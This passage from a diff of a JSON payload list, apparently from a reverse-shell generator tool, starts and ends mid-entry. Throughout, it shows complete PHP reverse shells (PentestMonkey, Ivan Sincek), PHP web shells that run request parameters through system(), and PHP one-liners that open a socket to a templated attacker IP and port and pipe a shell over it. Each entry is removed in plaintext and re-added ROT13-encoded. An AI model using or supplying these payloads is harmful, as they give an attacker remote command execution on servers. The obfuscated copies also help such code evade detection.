yratgu($tybony_cntr) . \"\\e\aPbaarpgvba: pybfr\\e\aPbagrag-Glcr: grkg\\/ugzy\\e\\a\\e\\a\" . $tybony_cntr;\a}\a",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "PHP PentestMonkey",
-        "command": "<?php\n// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php\n// Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n\nset_time_limit (0);\n$VERSION = \"1.0\";\n$ip = '{ip}';\n$port = {port};\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = 'uname -a; w; id; {shell} -i';\n$daemon = 0;\n$debug = 0;\n\nif (function_exists('pcntl_fork')) {\n\t$pid = pcntl_fork();\n\t\n\tif ($pid == -1) {\n\t\tprintit(\"ERROR: Can't fork\");\n\t\texit(1);\n\t}\n\t\n\tif ($pid) {\n\t\texit(0);  // Parent exits\n\t}\n\tif (posix_setsid() == -1) {\n\t\tprintit(\"Error: Can't setsid()\");\n\t\texit(1);\n\t}\n\n\t$daemon = 1;\n} else {\n\tprintit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n}\n\nchdir(\"/\");\n\numask(0);\n\n// Open reverse connection\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n\tprintit(\"$errstr ($errno)\");\n\texit(1);\n}\n\n$descriptorspec = array(\n   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from\n   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to\n   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to\n);\n\n$process = proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) {\n\tprintit(\"ERROR: Can't spawn shell\");\n\texit(1);\n}\n\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit(\"Successfully opened reverse shell to $ip:$port\");\n\nwhile (1) {\n\tif (feof($sock)) {\n\t\tprintit(\"ERROR: Shell connection terminated\");\n\t\tbreak;\n\t}\n\n\tif (feof($pipes[1])) {\n\t\tprintit(\"ERROR: Shell process terminated\");\n\t\tbreak;\n\t}\n\n\t$read_a = array($sock, $pipes[1], $pipes[2]);\n\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n\tif (in_array($sock, $read_a)) {\n\t\tif ($debug) printit(\"SOCK READ\");\n\t\t$input = fread($sock, $chunk_size);\n\t\tif ($debug) printit(\"SOCK: $input\");\n\t\tfwrite($pipes[0], $input);\n\t}\n\n\tif (in_array($pipes[1], $read_a)) {\n\t\tif ($debug) printit(\"STDOUT READ\");\n\t\t$input = fread($pipes[1], $chunk_size);\n\t\tif ($debug) printit(\"STDOUT: $input\");\n\t\tfwrite($sock, $input);\n\t}\n\n\tif (in_array($pipes[2], $read_a)) {\n\t\tif ($debug) printit(\"STDERR READ\");\n\t\t$input = fread($pipes[2], $chunk_size);\n\t\tif ($debug) printit(\"STDERR: $input\");\n\t\tfwrite($sock, $input);\n\t}\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\nfunction printit ($string) {\n\tif (!$daemon) {\n\t\tprint \"$string\\n\";\n\t}\n}\n\n?>",
-        "type": ["linux", "windows", "mac"]
+        "anzr": "CUC CragrfgZbaxrl",
+        "pbzznaq": "<?cuc\a// cuc-erirefr-furyy - N Erirefr Furyy vzcyrzragngvba va CUC. Pbzzragf fgevccrq gb fyvz vg qbja. ER: uggcf://enj.tvguhohfrepbagrag.pbz/cragrfgzbaxrl/cuc-erirefr-furyy/znfgre/cuc-erirefr-furyy.cuc\a// Pbclevtug (P) 2007 cragrfgzbaxrl@cragrfgzbaxrl.arg\a\afrg_gvzr_yvzvg (0);\a$IREFVBA = \"1.0\";\a$vc = '{vc}';\a$cbeg = {cbeg};\a$puhax_fvmr = 1400;\a$jevgr_n = ahyy;\a$reebe_n = ahyy;\a$furyy = 'hanzr -n; j; vq; {furyy} -v';\a$qnrzba = 0;\a$qroht = 0;\a\avs (shapgvba_rkvfgf('cpagy_sbex')) {\a\g$cvq = cpagy_sbex();\a\g\a\gvs ($cvq == -1) {\a\g\gcevagvg(\"REEBE: Pna'g sbex\");\a\g\grkvg(1);\a\g}\a\g\a\gvs ($cvq) {\a\g\grkvg(0);  // Cnerag rkvgf\a\g}\a\gvs (cbfvk_frgfvq() == -1) {\a\g\gcevagvg(\"Reebe: Pna'g frgfvq()\");\a\g\grkvg(1);\a\g}\a\a\g$qnrzba = 1;\a} ryfr {\a\gcevagvg(\"JNEAVAT: Snvyrq gb qnrzbavfr.  Guvf vf dhvgr pbzzba naq abg sngny.\");\a}\a\apuqve(\"/\");\a\ahznfx(0);\a\a// Bcra erirefr pbaarpgvba\a$fbpx = sfbpxbcra($vc, $cbeg, $reeab, $reefge, 30);\avs (!$fbpx) {\a\gcevagvg(\"$reefge ($reeab)\");\a\grkvg(1);\a}\a\a$qrfpevcgbefcrp = neenl(\a   0 => neenl(\"cvcr\", \"e\"),  // fgqva vf n cvcr gung gur puvyq jvyy ernq sebz\a   1 => neenl(\"cvcr\", \"j\"),  // fgqbhg vf n cvcr gung gur puvyq jvyy jevgr gb\a   2 => neenl(\"cvcr\", \"j\")   // fgqree vf n cvcr gung gur puvyq jvyy jevgr gb\a);\a\a$cebprff = cebp_bcra($furyy, $qrfpevcgbefcrp, $cvcrf);\a\avs (!vf_erfbhepr($cebprff)) {\a\gcevagvg(\"REEBE: Pna'g fcnja furyy\");\a\grkvg(1);\a}\a\afgernz_frg_oybpxvat($cvcrf[0], 0);\afgernz_frg_oybpxvat($cvcrf[1], 0);\afgernz_frg_oybpxvat($cvcrf[2], 0);\afgernz_frg_oybpxvat($fbpx, 0);\a\acevagvg(\"Fhpprffshyyl bcrarq erirefr furyy gb $vc:$cbeg\");\a\ajuvyr (1) {\a\gvs (srbs($fbpx)) {\a\g\gcevagvg(\"REEBE: Furyy pbaarpgvba grezvangrq\");\a\g\goernx;\a\g}\a\a\gvs (srbs($cvcrf[1])) {\a\g\gcevagvg(\"REEBE: Furyy cebprff grezvangrq\");\a\g\goernx;\a\g}\a\a\g$ernq_n = neenl($fbpx, $cvcrf[1], $cvcrf[2]);\a\g$ahz_punatrq_fbpxrgf = fgernz_fryrpg($ernq_n, $jevgr_n, $reebe_n, ahyy);\a\a\gvs (va_neenl($fbpx, $ernq_n)) {\a\g\gvs ($qroht) cevagvg(\"FBPX ERNQ\");\a\g\g$vachg = sernq($fbpx, $puhax_fvmr);\a\g\gvs ($qroht) cevagvg(\"FBPX: $vachg\");\a\g\gsjevgr($cvcrf[0], $vachg);\a\g}\a\a\gvs (va_neenl($cvcrf[1], $ernq_n)) {\a\g\gvs ($qroht) cevagvg(\"FGQBHG ERNQ\");\a\g\g$vachg = sernq($cvcrf[1], $puhax_fvmr);\a\g\gvs ($qroht) cevagvg(\"FGQBHG: $vachg\");\a\g\gsjevgr($fbpx, $vachg);\a\g}\a\a\gvs (va_neenl($cvcrf[2], $ernq_n)) {\a\g\gvs ($qroht) cevagvg(\"FGQREE ERNQ\");\a\g\g$vachg = sernq($cvcrf[2], $puhax_fvmr);\a\g\gvs ($qroht) cevagvg(\"FGQREE: $vachg\");\a\g\gsjevgr($fbpx, $vachg);\a\g}\a}\a\aspybfr($fbpx);\aspybfr($cvcrf[0]);\aspybfr($cvcrf[1]);\aspybfr($cvcrf[2]);\acebp_pybfr($cebprff);\a\ashapgvba cevagvg ($fgevat) {\a\gvs (!$qnrzba) {\a\g\gcevag \"$fgevat\\a\";\a\g}\a}\a\a?>",
+        "glcr": ["yvahk", "jvaqbjf", "znp"]
       },
       {
-        "name": "PHP Ivan Sincek",
-        "command":  "<?php\n// Copyright (c) 2020 Ivan Sincek\n// v2.3\n// Requires PHP v5.0.0 or greater.\n// Works on Linux OS, macOS, and Windows OS.\n// See the original script at https://github.com/pentestmonkey/php-reverse-shell.\nclass Shell {\n    private $addr  = null;\n    private $port  = null;\n    private $os    = null;\n    private $shell = null;\n    private $descriptorspec = array(\n        0 => array('pipe', 'r'), // shell can read from STDIN\n        1 => array('pipe', 'w'), // shell can write to STDOUT\n        2 => array('pipe', 'w')  // shell can write to STDERR\n    );\n    private $buffer  = 1024;    // read/write buffer size\n    private $clen    = 0;       // command length\n    private $error   = false;   // stream read/write error\n    public function __construct($addr, $port) {\n        $this->addr = $addr;\n        $this->port = $port;\n    }\n    private function detect() {\n        $detected = true;\n        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS\n            $this->os    = 'LINUX';\n            $this->shell = '{shell}';\n        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {\n            $this->os    = 'WINDOWS';\n            $this->shell = 'cmd.exe';\n        } else {\n            $detected = false;\n            echo \"SYS_ERROR: Underlying operating system is not supported, script will now exit...\\n\";\n        }\n        return $detected;\n    }\n    private function daemonize() {\n        $exit = false;\n        if (!function_exists('pcntl_fork')) {\n            echo \"DAEMONIZE: pcntl_fork() does not exists, moving on...\\n\";\n        } else if (($pid = @pcntl_fork()) < 0) {\n            echo \"DAEMONIZE: Cannot fork off the parent process, moving on...\\n\";\n        } else if ($pid > 0) {\n            $exit = true;\n            echo \"DAEMONIZE: Child process forked off successfully, parent process will now exit...\\n\";\n        } else if (posix_setsid() < 0) {\n            // once daemonized you will actually no longer see the script's dump\n            echo \"DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\\n\";\n        } else {\n            echo \"DAEMONIZE: Completed successfully!\\n\";\n        }\n        return $exit;\n    }\n    private function settings() {\n        @error_reporting(0);\n        @set_time_limit(0); // do not impose the script execution time limit\n        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories\n    }\n    private function dump($data) {\n        $data = str_replace('<', '&lt;', $data);\n        $data = str_replace('>', '&gt;', $data);\n        echo $data;\n    }\n    private function read($stream, $name, $buffer) {\n        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream\n            $this->error = true;                            // set global error flag\n            echo \"STRM_ERROR: Cannot read from ${name}, script will now exit...\\n\";\n        }\n        return $data;\n    }\n    private function write($stream, $name, $data) {\n        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream\n            $this->error = true;                            // set global error flag\n            echo \"STRM_ERROR: Cannot write to ${name}, script will now exit...\\n\";\n        }\n        return $bytes;\n    }\n    // read/write method for non-blocking streams\n    private function rw($input, $output, $iname, $oname) {\n        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {\n            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length\n            $this->dump($data); // script's dump\n        }\n    }\n    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)\n    // we must read the exact byte length from a stream and not a single byte more\n    private function brw($input, $output, $iname, $oname) {\n        $fstat = fstat($input);\n        $size = $fstat['size'];\n        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {\n            // for some reason Windows OS pipes STDIN into STDOUT\n            // we do not like that\n            // we need to discard the data from the stream\n            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {\n                $this->clen -= $bytes;\n                $size -= $bytes;\n            }\n        }\n        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {\n            $size -= $bytes;\n            $this->dump($data); // script's dump\n        }\n    }\n    public function run() {\n        if ($this->detect() && !$this->daemonize()) {\n            $this->settings();\n\n            // ----- SOCKET BEGIN -----\n            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);\n            if (!$socket) {\n                echo \"SOC_ERROR: {$errno}: {$errstr}\\n\";\n            } else {\n                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS\n\n                // ----- SHELL BEGIN -----\n                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);\n                if (!$process) {\n                    echo \"PROC_ERROR: Cannot start the shell\\n\";\n                } else {\n                    foreach ($pipes as $pipe) {\n                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS\n                    }\n\n                    // ----- WORK BEGIN -----\n                    $status = proc_get_status($process);\n                    @fwrite($socket, \"SOCKET: Shell has connected! PID: \" . $status['pid'] . \"\\n\");\n                    do {\n\t\t\t\t\t\t$status = proc_get_status($process);\n                        if (feof($socket)) { // check for end-of-file on SOCKET\n                            echo \"SOC_ERROR: Shell connection has been terminated\\n\"; break;\n                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running\n                            echo \"PROC_ERROR: Shell process has been terminated\\n\";   break; // feof() does not work with blocking streams\n                        }                                                                    // use proc_get_status() instead\n                        $streams = array(\n                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR\n                            'write'  => null,\n                            'except' => null\n                        );\n                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS\n                        if ($num_changed_streams === false) {\n                            echo \"STRM_ERROR: stream_select() failed\\n\"; break;\n                        } else if ($num_changed_streams > 0) {\n                            if ($this->os === 'LINUX') {\n                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN\n                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET\n                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET\n                            } else if ($this->os === 'WINDOWS') {\n                                // order is important\n                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN\n                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET\n                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET\n                            }\n                        }\n                    } while (!$this->error);\n                    // ------ WORK END ------\n\n                    foreach ($pipes as $pipe) {\n                        fclose($pipe);\n                    }\n                    proc_close($process);\n                }\n                // ------ SHELL END ------\n\n                fclose($socket);\n            }\n            // ------ SOCKET END ------\n\n        }\n    }\n}\necho '<pre>';\n// change the host address and/or port number as necessary\n$sh = new Shell('{ip}', {port});\n$sh->run();\nunset($sh);\n// garbage collector requires PHP v5.3.0 or greater\n// @gc_collect_cycles();\necho '</pre>';\n?>",
-        "type": ["linux", "windows", "mac"]
+        "anzr": "CUC Vina Fvaprx",
+        "pbzznaq":  "<?cuc\a// Pbclevtug (p) 2020 Vina Fvaprx\a// i2.3\a// Erdhverf CUC i5.0.0 be terngre.\a// Jbexf ba Yvahk BF, znpBF, naq Jvaqbjf BF.\a// Frr gur bevtvany fpevcg ng uggcf://tvguho.pbz/cragrfgzbaxrl/cuc-erirefr-furyy.\apynff Furyy {\a    cevingr $nqqe  = ahyy;\a    cevingr $cbeg  = ahyy;\a    cevingr $bf    = ahyy;\a    cevingr $furyy = ahyy;\a    cevingr $qrfpevcgbefcrp = neenl(\a        0 => neenl('cvcr', 'e'), // furyy pna ernq sebz FGQVA\a        1 => neenl('cvcr', 'j'), // furyy pna jevgr gb FGQBHG\a        2 => neenl('cvcr', 'j')  // furyy pna jevgr gb FGQREE\a    );\a    cevingr $ohssre  = 1024;    // ernq/jevgr ohssre fvmr\a    cevingr $pyra    = 0;       // pbzznaq yratgu\a    cevingr $reebe   = snyfr;   // fgernz ernq/jevgr reebe\a    choyvp shapgvba __pbafgehpg($nqqe, $cbeg) {\a        $guvf->nqqe = $nqqe;\a        $guvf->cbeg = $cbeg;\a    }\a    cevingr shapgvba qrgrpg() {\a        $qrgrpgrq = gehr;\a        vs (fgevcbf(CUC_BF, 'YVAHK') !== snyfr) { // fnzr sbe znpBF\a            $guvf->bf    = 'YVAHK';\a            $guvf->furyy = '{furyy}';\a        } ryfr vs (fgevcbf(CUC_BF, 'JVA32') !== snyfr || fgevcbf(CUC_BF, 'JVAAG') !== snyfr || fgevcbf(CUC_BF, 'JVAQBJF') !== snyfr) {\a            $guvf->bf    = 'JVAQBJF';\a            $guvf->furyy = 'pzq.rkr';\a        } ryfr {\a            $qrgrpgrq = snyfr;\a            rpub \"FLF_REEBE: Haqreylvat bcrengvat flfgrz vf abg fhccbegrq, fpevcg jvyy abj rkvg...\\a\";\a        }\a        erghea $qrgrpgrq;\a    }\a    cevingr shapgvba qnrzbavmr() {\a        $rkvg = snyfr;\a        vs (!shapgvba_rkvfgf('cpagy_sbex')) {\a            rpub \"QNRZBAVMR: cpagy_sbex() qbrf abg rkvfgf, zbivat ba...\\a\";\a        } ryfr vs (($cvq = @cpagy_sbex()) < 0) {\a            rpub \"QNRZBAVMR: Pnaabg sbex bss gur cnerag cebprff, zbivat ba...\\a\";\a        } ryfr vs ($cvq > 0) {\a            $rkvg = gehr;\a            rpub \"QNRZBAVMR: Puvyq cebprff sbexrq bss fhpprffshyyl, cnerag cebprff jvyy abj rkvg...\\a\";\a        } ryfr vs (cbfvk_frgfvq() < 0) {\a            // bapr qnrzbavmrq lbh jvyy npghnyyl ab ybatre frr gur fpevcg'f qhzc\a            rpub \"QNRZBAVMR: Sbexrq bss gur cnerag cebprff ohg pnaabg frg n arj FVQ, zbivat ba nf na becuna...\\a\";\a        } ryfr {\a            rpub \"QNRZBAVMR: Pbzcyrgrq fhpprffshyyl!\\a\";\a        }\a        erghea $rkvg;\a    }\a    cevingr shapgvba frggvatf() {\a        @reebe_ercbegvat(0);\a        @frg_gvzr_yvzvg(0); // qb abg vzcbfr gur fpevcg rkrphgvba gvzr yvzvg\a        @hznfx(0); // frg gur svyr/qverpgbel crezvffvbaf - 666 sbe svyrf naq 777 sbe qverpgbevrf\a    }\a    cevingr shapgvba qhzc($qngn) {\a        $qngn = fge_ercynpr('<', '&yg;', $qngn);\a        $qngn = fge_ercynpr('>', '&tg;', $qngn);\a        rpub $qngn;\a    }\a    cevingr shapgvba ernq($fgernz, $anzr, $ohssre) {\a        vs (($qngn = @sernq($fgernz, $ohssre)) === snyfr) { // fhccerff na reebe jura ernqvat sebz n pybfrq oybpxvat fgernz\a            $guvf->reebe = gehr;                            // frg tybony reebe synt\a            rpub \"FGEZ_REEBE: Pnaabg ernq sebz ${anzr}, fpevcg jvyy abj rkvg...\\a\";\a        }\a        erghea $qngn;\a    }\a    cevingr shapgvba jevgr($fgernz, $anzr, $qngn) {\a        vs (($olgrf = @sjevgr($fgernz, $qngn)) === snyfr) { // fhccerff na reebe jura jevgvat gb n pybfrq oybpxvat fgernz\a            $guvf->reebe = gehr;                            // frg tybony reebe synt\a            rpub \"FGEZ_REEBE: Pnaabg jevgr gb ${anzr}, fpevcg jvyy abj rkvg...\\a\";\a        }\a        erghea $olgrf;\a    }\a    // ernq/jevgr zrgubq sbe aba-oybpxvat fgernzf\a    cevingr shapgvba ej($vachg, $bhgchg, $vanzr, $banzr) {\a        juvyr (($qngn = $guvf->ernq($vachg, $vanzr, $guvf->ohssre)) && $guvf->jevgr($bhgchg, $banzr, $qngn)) {\a            vs ($guvf->bf === 'JVAQBJF' && $banzr === 'FGQVA') { $guvf->pyra += fgeyra($qngn); } // pnyphyngr gur pbzznaq yratgu\a            $guvf->qhzc($qngn); // fpevcg'f qhzc\a        }\a    }\a    // ernq/jevgr zrgubq sbe oybpxvat fgernzf (r.t. sbe FGQBHG naq FGQREE ba Jvaqbjf BF)\a    // jr zhfg ernq gur rknpg olgr yratgu sebz n fgernz naq abg n fvatyr olgr zber\a    cevingr shapgvba oej($vachg, $bhgchg, $vanzr, $banzr) {\a        $sfgng = sfgng($vachg);\a        $fvmr = $sfgng['fvmr'];\a        vs ($guvf->bf === 'JVAQBJF' && $vanzr === 'FGQBHG' && $guvf->pyra) {\a            // sbe fbzr ernfba Jvaqbjf BF cvcrf FGQVA vagb FGQBHG\a            // jr qb abg yvxr gung\a            // jr arrq gb qvfpneq gur qngn sebz gur fgernz\a            juvyr ($guvf->pyra > 0 && ($olgrf = $guvf->pyra >= $guvf->ohssre ? $guvf->ohssre : $guvf->pyra) && $guvf->ernq($vachg, $vanzr, $olgrf)) {\a                $guvf->pyra -= $olgrf;\a                $fvmr -= $olgrf;\a            }\a        }\a        juvyr ($fvmr > 0 && ($olgrf = $fvmr >= $guvf->ohssre ? $guvf->ohssre : $fvmr) && ($qngn = $guvf->ernq($vachg, $vanzr, $olgrf)) && $guvf->jevgr($bhgchg, $banzr, $qngn)) {\a            $fvmr -= $olgrf;\a            $guvf->qhzc($qngn); // fpevcg'f qhzc\a        }\a    }\a    choyvp shapgvba eha() {\a        vs ($guvf->qrgrpg() && !$guvf->qnrzbavmr()) {\a            $guvf->frggvatf();\a\a            // ----- FBPXRG ORTVA -----\a            $fbpxrg = @sfbpxbcra($guvf->nqqe, $guvf->cbeg, $reeab, $reefge, 30);\a            vs (!$fbpxrg) {\a                rpub \"FBP_REEBE: {$reeab}: {$reefge}\\a\";\a            } ryfr {\a                fgernz_frg_oybpxvat($fbpxrg, snyfr); // frg gur fbpxrg fgernz gb aba-oybpxvat zbqr | ergheaf 'gehr' ba Jvaqbjf BF\a\a                // ----- FURYY ORTVA -----\a                $cebprff = @cebp_bcra($guvf->furyy, $guvf->qrfpevcgbefcrp, $cvcrf, ahyy, ahyy);\a                vs (!$cebprff) {\a                    rpub \"CEBP_REEBE: Pnaabg fgneg gur furyy\\a\";\a                } ryfr {\a                    sbernpu ($cvcrf nf $cvcr) {\a                        fgernz_frg_oybpxvat($cvcr, snyfr); // frg gur furyy fgernzf gb aba-oybpxvat zbqr | ergheaf 'snyfr' ba Jvaqbjf BF\a                    }\a\a                    // ----- JBEX ORTVA -----\a                    $fgnghf = cebp_trg_fgnghf($cebprff);\a                    @sjevgr($fbpxrg, \"FBPXRG: Furyy unf pbaarpgrq! CVQ: \" . $fgnghf['cvq'] . \"\\a\");\a                    qb {\a\g\g\g\g\g\g$fgnghf = cebp_trg_fgnghf($cebprff);\a                        vs (srbs($fbpxrg)) { // purpx sbe raq-bs-svyr ba FBPXRG\a                            rpub \"FBP_REEBE: Furyy pbaarpgvba unf orra grezvangrq\\a\"; oernx;\a                        } ryfr vs (srbs($cvcrf[1]) || !$fgnghf['ehaavat']) {                 // purpx sbe raq-bs-svyr ba FGQBHG be vs cebprff vf fgvyy ehaavat\a                            rpub \"CEBP_REEBE: Furyy cebprff unf orra grezvangrq\\a\";   oernx; // srbs() qbrf abg jbex jvgu oybpxvat fgernzf\a                        }                                                                    // hfr cebp_trg_fgnghf() vafgrnq\a                        $fgernzf = neenl(\a                            'ernq'   => neenl($fbpxrg, $cvcrf[1], $cvcrf[2]), // FBPXRG | FGQBHG | FGQREE\a                            'jevgr'  => ahyy,\a                            'rkprcg' => ahyy\a                        );\a                        $ahz_punatrq_fgernzf = @fgernz_fryrpg($fgernzf['ernq'], $fgernzf['jevgr'], $fgernzf['rkprcg'], 0); // jnvg sbe fgernz punatrf | jvyy abg jnvg ba Jvaqbjf BF\a                        vs ($ahz_punatrq_fgernzf === snyfr) {\a                            rpub \"FGEZ_REEBE: fgernz_fryrpg() snvyrq\\a\"; oernx;\a                        } ryfr vs ($ahz_punatrq_fgernzf > 0) {\a                            vs ($guvf->bf === 'YVAHK') {\a                                vs (va_neenl($fbpxrg  , $fgernzf['ernq'])) { $guvf->ej($fbpxrg  , $cvcrf[0], 'FBPXRG', 'FGQVA' ); } // ernq sebz FBPXRG naq jevgr gb FGQVA\a                                vs (va_neenl($cvcrf[2], $fgernzf['ernq'])) { $guvf->ej($cvcrf[2], $fbpxrg  , 'FGQREE', 'FBPXRG'); } // ernq sebz FGQREE naq jevgr gb FBPXRG\a                                vs (va_neenl($cvcrf[1], $fgernzf['ernq'])) { $guvf->ej($cvcrf[1], $fbpxrg  , 'FGQBHG', 'FBPXRG'); } // ernq sebz FGQBHG naq jevgr gb FBPXRG\a                            } ryfr vs ($guvf->bf === 'JVAQBJF') {\a                                // beqre vf vzcbegnag\a                                vs (va_neenl($fbpxrg, $fgernzf['ernq'])/*------*/) { $guvf->ej ($fbpxrg  , $cvcrf[0], 'FBPXRG', 'FGQVA' ); } // ernq sebz FBPXRG naq jevgr gb FGQVA\a                                vs (($sfgng = sfgng($cvcrf[2])) && $sfgng['fvmr']) { $guvf->oej($cvcrf[2], $fbpxrg  , 'FGQREE', 'FBPXRG'); } // ernq sebz FGQREE naq jevgr gb FBPXRG\a                                vs (($sfgng = sfgng($cvcrf[1])) && $sfgng['fvmr']) { $guvf->oej($cvcrf[1], $fbpxrg  , 'FGQBHG', 'FBPXRG'); } // ernq sebz FGQBHG naq jevgr gb FBPXRG\a                            }\a                        }\a                    } juvyr (!$guvf->reebe);\a                    // ------ JBEX RAQ ------\a\a                    sbernpu ($cvcrf nf $cvcr) {\a                        spybfr($cvcr);\a                    }\a                    cebp_pybfr($cebprff);\a                }\a                // ------ FURYY RAQ ------\a\a                spybfr($fbpxrg);\a            }\a            // ------ FBPXRG RAQ ------\a\a        }\a    }\a}\arpub '<cer>';\a// punatr gur ubfg nqqerff naq/be cbeg ahzore nf arprffnel\a$fu = arj Furyy('{vc}', {cbeg});\a$fu->eha();\ahafrg($fu);\a// tneontr pbyyrpgbe erdhverf CUC i5.3.0 be terngre\a// @tp_pbyyrpg_plpyrf();\arpub '</cer>';\a?>",
+        "glcr": ["yvahk", "jvaqbjf", "znp"]
       },
       {
-        "name": "PHP cmd",
-        "command": "<html>\n<body>\n<form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\">\n<input type=\"TEXT\" name=\"cmd\" id=\"cmd\" size=\"80\">\n<input type=\"SUBMIT\" value=\"Execute\">\n<\/form>\n<pre>\n<?php\n    if(isset($_GET['cmd']))\n    {\n        system($_GET['cmd']);\n    }\n?>\n<\/pre>\n<\/body>\n<script>document.getElementById(\"cmd\").focus();<\/script>\n<\/html>",
-        "type": ["linux", "windows", "mac"]
+        "anzr": "CUC pzq",
+        "pbzznaq": "<ugzy>\a<obql>\a<sbez zrgubq=\"TRG\" anzr=\"<?cuc rpub onfranzr($_FREIRE['CUC_FRYS']); ?>\">\a<vachg glcr=\"GRKG\" anzr=\"pzq\" vq=\"pzq\" fvmr=\"80\">\a<vachg glcr=\"FHOZVG\" inyhr=\"Rkrphgr\">\a<\/sbez>\a<cer>\a<?cuc\a    vs(vffrg($_TRG['pzq']))\a    {\a        flfgrz($_TRG['pzq']);\a    }\a?>\a<\/cer>\a<\/obql>\a<fpevcg>qbphzrag.trgRyrzragOlVq(\"pzq\").sbphf();<\/fpevcg>\a<\/ugzy>",
+        "glcr": ["yvahk", "jvaqbjf", "znp"]
       },
       {
-        "name": "PHP cmd 2",
-        "command": "<?php if(isset($_REQUEST[\"cmd\"])){ echo \"<pre>\"; $cmd = ($_REQUEST[\"cmd\"]); system($cmd); echo \"<\/pre>\"; die; }?>",
-        "type": ["linux", "windows", "mac"]
+        "anzr": "CUC pzq 2",
+        "pbzznaq": "<?cuc vs(vffrg($_ERDHRFG[\"pzq\"])){ rpub \"<cer>\"; $pzq = ($_ERDHRFG[\"pzq\"]); flfgrz($pzq); rpub \"<\/cer>\"; qvr; }?>",
+        "glcr": ["yvahk", "jvaqbjf", "znp"]
       },
       {
-        "name": "PHP cmd small",
-        "command": "<?=`$_GET[0]`?>",
-        "type": ["linux", "windows", "mac"]
+        "anzr": "CUC pzq fznyy",
+        "pbzznaq": "<?=`$_TRG[0]`?>",
+        "glcr": ["yvahk", "jvaqbjf", "znp"]
       },
       {
-        "name": "PHP exec",
-        "command": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"{shell} <&3 >&3 2>&3\");'",
-        "type": ["linux", "mac"]
+        "anzr": "CUC rkrp",
+        "pbzznaq": "cuc -e '$fbpx=sfbpxbcra(\"{vc}\",{cbeg});rkrp(\"{furyy} <&3 >&3 2>&3\");'",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "PHP shell_exec",
-        "command": "php -r '$sock=fsockopen(\"{ip}\",{port});shell_exec(\"{shell} <&3 >&3 2>&3\");'",
-        "type": ["linux", "mac"]
+        "anzr": "CUC furyy_rkrp",
+        "pbzznaq": "cuc -e '$fbpx=sfbpxbcra(\"{vc}\",{cbeg});furyy_rkrp(\"{furyy} <&3 >&3 2>&3\");'",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "PHP system",
-        "command": "php -r '$sock=fsockopen(\"{ip}\",{port});system(\"{shell} <&3 >&3 2>&3\");'",
-        "type": ["linux", "windows", "mac"]
+        "anzr": "CUC flfgrz",
+        "pbzznaq": "cuc -e '$fbpx=sfbpxbcra(\"{vc}\",{cbeg});flfgrz(\"{furyy} <&3 >&3 2>&3\");'",
+        "glcr": ["yvahk", "jvaqbjf", "znp"]
       },
       {
-        "name": "PHP passthru",
-        "command": "php -r '$sock=fsockopen(\"{ip}\",{port});passthru(\"{shell} <&3 >&3 2>&3\");'",
-        "type": ["linux", "mac"]
+        "anzr": "CUC cnffgueh",
